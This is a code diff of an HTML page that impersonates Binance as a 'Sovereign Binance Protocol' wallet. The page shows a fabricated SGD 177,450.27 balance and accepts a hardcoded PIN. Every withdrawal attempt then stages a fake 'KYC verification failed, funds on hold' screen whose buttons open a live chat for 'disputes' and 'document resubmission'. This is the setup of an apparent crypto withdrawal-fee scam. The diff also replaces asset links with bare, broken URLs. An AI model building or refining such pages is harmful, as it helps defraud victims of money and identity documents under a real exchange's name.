@@ -5,7 +5,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Binance Protocol Index</title>
     <!-- Core Bootstrap 5 CDN Link -->
-    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <link href="https://jsdelivr.net" rel="stylesheet">
     <style>
         :root {
             --term-dark-bg: #0b0e11;
@@ -92,6 +92,15 @@
             border-radius: 4px;
         }
 
+        .warning-info-box {
+            background-color: rgba(30, 35, 41, 0.6);
+            border: 1px dashed #474d57;
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 8px;
+            text-align: center;
+        }
+
         .code-details-block {
             background-color: rgba(30, 35, 41, 0.8);
             border: 1px solid var(--term-border);
@@ -117,11 +126,8 @@
             text-decoration: none;
             display: block;
         }
-
         .btn-message:hover {
             background-color: var(--term-gold-hover) !important;
-            transform: translateY(-1px);
-            text-decoration: none;
             color: #000000 !important;
         }
 
@@ -140,26 +146,11 @@
             text-decoration: none;
             display: block;
         }
-
         .btn-dispute:hover {
             background-color: #e63550 !important;
-            transform: translateY(-1px);
-            text-decoration: none;
             color: #ffffff !important;
         }
 
-        .biometric-icon {
-            font-size: 4rem;
-            margin-bottom: 20px;
-            animation: pulse 2s infinite;
-        }
-
-        @keyframes pulse {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.6; }
-        }
-
-        /* Live Agent Widget Styling */
         .live-agent-widget {
             position: fixed;
             bottom: 30px;
@@ -180,15 +171,7 @@
             transition: all 0.3s ease;
             position: relative;
         }
-
-        .agent-bubble:hover {
-            transform: scale(1.1);
-            box-shadow: 0 6px 16px rgba(240, 185, 11, 0.5);
-        }
-
-        .agent-logo {
-            font-size: 2.5rem;
-        }
+        .agent-bubble:hover { transform: scale(1.1); }
 
         .agent-status {
             position: absolute;
@@ -212,7 +195,6 @@
             font-weight: 900;
             font-size: 1.5rem;
             color: #000000;
-            font-family: Arial, sans-serif;
         }
 
         .agent-tooltip {
@@ -229,21 +211,17 @@
             font-size: 0.85rem;
             display: none;
         }
-
-        .agent-bubble:hover .agent-tooltip {
-            display: block;
-        }
+        .agent-bubble:hover .agent-tooltip { display: block; }
     </style>
 </head>
 <body class="terminal-layout">
 
-    <!-- APPLICATION HEADER -->
     <header class="terminal-top-bar">
         <div class="container d-flex justify-content-between align-items-center">
             <div class="fw-bold text-white fs-5" style="letter-spacing: 0.5px;">
                 <span style="color: var(--term-accent-gold);">SOVEREIGN</span> BINANCE PROTOCOL
             </div>
-            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">BINANCE  COMPLIANCE SECURITY</span>
+            <span class="badge bg-dark border border-secondary text-white-50 px-3 py-2" style="font-size: 0.75rem;">BINANCE COMPLIANCE SECURITY</span>
         </div>
     </header>
 
@@ -256,41 +234,18 @@
                     <h3 class="fw-bold mb-2 text-white">Digital Asset Wallet</h3>
                     <p style="color: var(--term-text-muted);" class="small mb-4">Premium Account Status: ACTIVE</p>
                     
-                    <div class="p-3 mb-4 rounded border border-secondary" style="background-color: var(--term-panel-dark);">
-                        <small class="text-muted d-block small fw-bold tracking-wider">BASE ASSET BALANCE</small>
-                        <h3 class="fw-bold my-1" style="color: var(--success-green); font-family: monospace;">177,450.27 SGD</h3>
+                    <div class="p-3 mb-4 rounded border border-secondary text-start">
+                        <span class="text-muted small">Available Balance</span>
+                        <h2 class="fw-bold text-white mt-1">SGD 177,450.27</h2>
                     </div>
 
-                    <p class="small text-white-50 text-start mb-4">Manage your asset allocation and execute withdrawal requests through the secure routing interface.</p>
-                    <button class="btn-term-gold w-100 text-uppercase" onclick="showBiometricVerification()">Initiate Withdrawal</button>
-                </div>
-
-                <!-- STEP 2: BIOMETRIC VERIFICATION -->
-                <div id="layerBiometricVerification" class="app-flow-card d-none text-center">
-                    <div class="biometric-icon">🔐</div>
-                    <h3 class="fw-bold mb-2 text-white">Biometric Verification Required</h3>
-                    <p style="color: var(--term-text-muted);" class="small mb-4">Verify your identity using facial recognition or fingerprint to proceed with the withdrawal.</p>
-                    
-                    <div class="mb-4 p-4 rounded" style="background-color: var(--term-panel-dark); border: 2px dashed var(--term-border);">
-                        <p class="text-muted small mb-0">Scanning biometric data...</p>
-                        <p style="color: var(--term-accent-gold);" class="fw-bold mt-2">📹 Position your face in the camera</p>
+                    <div class="mb-4 text-start">
+                        <label class="form-label text-muted small">Enter Authorization PIN to Proceed:</label>
+                        <input type="password" id="pinVerificationInput" class="term-input-field text-center" placeholder="******" maxlength="6">
                     </div>
 
-                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeBiometricVerification()">Verify Biometric</button>
-                    <button class="btn-message" onclick="switchToWallet()" style="background-color: var(--term-border); margin-top: 10px;">Cancel</button>
+                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Authorize Transfer</button>
                 </div>
-
-                <!-- STEP 3: SECURITY AUTHENTICATION INPUT -->
-                <div id="layerPINVerification" class="app-flow-card d-none text-center">
-                    <h3 class="fw-bold mb-2 text-white">Security Sign-Off Required</h3>
-                    <p style="color: var(--term-text-muted);" class="small mb-4">Input the 6-digit security code to authorize the withdrawal of SGD 177,450.27.</p>
-                    
-                    <div class="mb-4">
-                        <input type="password" id="pinVerificationInput" class="form-control term-input-field text-center fs-2 tracking-widest mx-auto" style="max-width: 220px;" maxlength="6" placeholder="000000">
-                    </div>
-                    <button class="btn-term-gold w-100 text-uppercase" onclick="executeTokenValidation()">Execute Signature Verification</button>
-                </div>
-
                 <!-- STEP 4: PROCESSING RUNTIME SPINNER -->
                 <div id="layerLoadingWheel" class="app-flow-card d-none text-center py-5">
                     <div class="spinner-border mb-3" style="width: 3.5rem; height: 3.5rem; color: var(--term-accent-gold);" role="status"></div>
@@ -298,7 +253,7 @@
                     <p class="text-muted small mb-0">Validating security parameters and preparing asset transfer.</p>
                 </div>
 
-                <!-- STEP 5: KYC FAILED - INSUFFICIENT DOCUMENTS -->
+                <!-- STEP 5: KYC FAILED - INSUFFICIENT DOCUMENTS PANEL -->
                 <div id="layerKYCFailed" class="app-flow-card d-none text-center">
                     <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
                         <h3 class="m-0" style="color: var(--error-red); font-size: 3rem;">✕</h3>
@@ -306,31 +261,32 @@
                     <h4 class="fw-bold m-0 text-white mb-3">KYC Verification Failed</h4>
                     <hr class="border-secondary">
                     
-                    <div class="security-notice-text small text-white-50 mb-4">
-                        <p class="mb-3"><strong>Status:</strong> WITHDRAWAL BLOCKED - INSUFFICIENT DOCUMENTS</p>
+                    <!-- BOX PARA SA STATUS TEXT AT TALATA -->
+                    <div class="warning-info-box text-white-50 small">
+                        <p class="mb-3 text-white"><strong style="color: var(--error-red);">Status:</strong> WITHDRAWAL BLOCKED - INSUFFICIENT DOCUMENTS</p>
                         <p class="mb-3">Your account has failed KYC (Know Your Customer) verification due to incomplete or insufficient documentation.</p>
-                        <p class="mb-3">Your funds remain in your account but are currently on hold pending document resubmission and re-verification.</p>
+                        <p class="mb-0">Your funds remain in your account but are currently on hold pending document resubmission and re-verification.</p>
+                    </div>
                         
-                        <div class="error-highlight-box text-white">
-                            <p class="mb-2"><strong>⚠️ Account Status:</strong></p>
-                            <p class="m-0">FUNDS ON HOLD - KYC VERIFICATION FAILED</p>
-                        </div>
-
-                        <div class="code-details-block">
-                            <p class="m-0 text-danger fw-bold">ACCOUNT REFERENCE:</p>
-                            <p class="m-0" id="failedRef">***-****-258349</p>
-                            <p class="m-0">Amount: SGD 177,450.27</p>
-                            <p class="m-0">Status: ✕ BLOCKED - INSUFFICIENT DOCUMENTS</p>
-                            <p class="m-0 mt-2">Reason: KYC verification documents incomplete</p>
-                        </div>
+                    <div class="error-highlight-box text-white mt-4">
+                        <p class="mb-2"><strong>⚠️ Account Status:</strong></p>
+                        <p class="m-0">FUNDS ON HOLD - KYC VERIFICATION FAILED</p>
                     </div>
 
-                    <p class="text-muted small mb-3">Need to dispute this decision or resubmit documents?</p>
-                    <a href="https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default" target="_blank" class="btn-dispute">🔴 Open Dispute & Chat with Support</a>
-                    <a href="https://embed.tawk.to/6a1cd8c4e717081c2b47ed79/default" target="_blank" class="btn-message">📨 Resubmit Documents</a>
+                    <div class="code-details-block text-start">
+                        <p class="m-0 text-danger fw-bold">ACCOUNT REFERENCE:</p>
+                        <p class="m-0" id="failedRef">***-****-258349</p>
+                        <p class="m-0">Amount: SGD 177,450.27</p>
+                        <p class="m-0">Status: ✕ BLOCKED - INSUFFICIENT DOCUMENTS</p>
+                        <p class="m-0 mt-2">Reason: KYC verification documents incomplete</p>
+                    </div>
+
+                    <p class="text-muted small mb-3 mt-4">Need to dispute this decision or resubmit documents?</p>
+                    <button class="btn-dispute" id="dispute-btn">🔴 Open Dispute & Chat with Support</button>
+                    <button class="btn-message" id="resubmit-btn">📨 Resubmit Documents</button>
                 </div>
 
-                <!-- STEP 6: SUCCESS COMPLETION -->
+                <!-- STEP 6: SUCCESS PANEL -->
                 <div id="layerSuccess" class="app-flow-card d-none text-center">
                     <div class="d-flex align-items-center gap-3 mb-3 justify-content-center">
                         <h3 class="m-0" style="color: var(--success-green); font-size: 3rem;">✓</h3>
@@ -341,21 +297,17 @@
                     <div class="security-notice-text small text-white-50">
                         <p class="mb-3"><strong>Status:</strong> WITHDRAWAL AUTHORIZED & PROCESSING</p>
                         <p class="mb-3">Your asset transfer has been successfully verified and approved for execution.</p>
-                        
                         <div class="highlight-box text-white">
                             <p class="fw-bold mb-2">✓ Transfer Details Confirmed</p>
                             <p class="mb-0">SGD 177,450.27 will arrive after the verification</p>
                         </div>
-
-                        <div class="code-details-block">
+                        <div class="code-details-block text-start">
                             <p class="m-0 text-success fw-bold">TRANSACTION CONFIRMATION:</p>
-                            <p class="m-0" id="successTxnRef">***-****-258349</p>
+                            <p class="m-0">***-****-258349</p>
                             <p class="m-0">Amount: SGD 177,450.27</p>
                             <p class="m-0">Status: ✓ AUTHORIZED</p>
-                            <p class="m-0">Execution: Automatic Processing</p>
                         </div>
                     </div>
-
                     <button class="btn-term-gold w-100 mt-4 text-uppercase" onclick="resetWorkflowIndex()">Return to Wallet</button>
                 </div>
 
@@ -363,83 +315,74 @@
         </div>
     </div>
 
-    <!-- LIVE AGENT WIDGET -->
+    <!-- CUSTOM LIVE AGENT BUBBLE -->
     <div class="live-agent-widget">
-        <div class="agent-bubble">
+        <div class="agent-bubble" id="custom-agent-bubble">
             <div class="agent-profile-avatar">B</div>
             <div class="agent-status"></div>
             <div class="agent-tooltip">Live Agent Support</div>
         </div>
     </div>
 
-    <!-- JAVASCRIPT STATE CONTROLLER MATRIX -->
+    <!-- STATE MATRIX CONTROLLER -->
     <script>
-        // State machine visibility toggle utility
         function switchState(hideElementId, showElementId) {
             const hideTarget = document.getElementById(hideElementId);
             const showTarget = document.getElementById(showElementId);
-            
             if (hideTarget && showTarget) {
                 hideTarget.classList.add('d-none');
                 showTarget.classList.remove('d-none');
             }
         }
 
-        // Show biometric verification layer
-        function showBiometricVerification() {
-            switchState('layerWallet', 'layerBiometricVerification');
-        }
-
-        // Switch back to wallet
-        function switchToWallet() {
-            switchState('layerBiometricVerification', 'layerWallet');
-        }
-
-        // Execute biometric verification
-        function executeBiometricVerification() {
-            // Simulate biometric processing delay
-            const biometricIcon = document.querySelector('.biometric-icon');
-            if (biometricIcon) {
-                biometricIcon.textContent = '✓';
-                biometricIcon.style.color = 'var(--success-green)';
-            }
-            
-            setTimeout(function() {
-                switchState('layerBiometricVerification', 'layerPINVerification');
-                // Reset biometric icon for next cycle
-                if (biometricIcon) {
-                    biometricIcon.textContent = '🔐';
-                    biometricIcon.style.color = 'inherit';
-                }
-            }, 2000);
-        }
-
-        // Process secure code input logic checks
         function executeTokenValidation() {
             const secretCodeField = document.getElementById('pinVerificationInput');
-            
-            // Dynamic input validation evaluation matching lab parameters
             if (secretCodeField && secretCodeField.value.trim() === "120352") {
-                switchState('layerPINVerification', 'layerLoadingWheel');
-                
-                // Emulates an algorithmic execution processing delay before KYC failed state
+                switchState('layerWallet', 'layerLoadingWheel');
                 setTimeout(function() {
                     switchState('layerLoadingWheel', 'layerKYCFailed');
                 }, 3000);
             } else {
-                alert("Security matrix mismatch: Input parameters incorrect.");
+                alert("Security matrix mismatch. (Use PIN: 120352)");
             }
         }
 
-        // Clean structural variables state baseline back to origin
         function resetWorkflowIndex() {
             const targetPin = document.getElementById('pinVerificationInput');
-            
             if (targetPin) targetPin.value = '';
-            
             switchState('layerSuccess', 'layerWallet');
         }
     </script>
 
+    <!-- TAWK.TO LIVE INTERFACES EXECUTION -->
+    <script type="text/javascript">
+    var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
+    (function(){
+        var s1=document.createElement("script"),s0=document.getElementsByTagName("script");
+        s1.async=true;
+        s1.src='https://tawk.to';
+        s1.charset='UTF-8';
+        s1.setAttribute('crossorigin','*');
+        s0.parentNode.insertBefore(s1,s0);
+    })();
+
+    Tawk_API = Tawk_API || {};
+    Tawk_API.onLoad = function(){
+        Tawk_API.hideWidget();
+        
+        function openLiveChat(e) {
+            e.preventDefault();
+            Tawk_API.showWidget();
+            Tawk_API.maximize();
+        }
+
+        document.getElementById('dispute-btn').addEventListener('click', openLiveChat);
+        document.getElementById('resubmit-btn').addEventListener('click', openLiveChat);
+        document.getElementById('custom-agent-bubble').addEventListener('click', openLiveChat);
+    };
+
+    Tawk_API.onChatMaximized = function(){ Tawk_API.showWidget(); };
+    Tawk_API.onChatMinimized = function(){ Tawk_API.hideWidget(); };
+    </script>
 </body>
 </html>
